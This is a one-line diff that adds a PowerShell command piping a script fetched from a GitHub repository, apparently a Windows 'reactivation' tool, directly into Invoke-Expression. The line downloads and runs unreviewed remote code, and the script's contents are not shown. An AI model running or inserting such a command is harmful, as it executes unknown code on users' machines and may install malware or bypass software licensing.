@@ -1,0 +1,1 @@
+iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/ReactivateScript" | iex
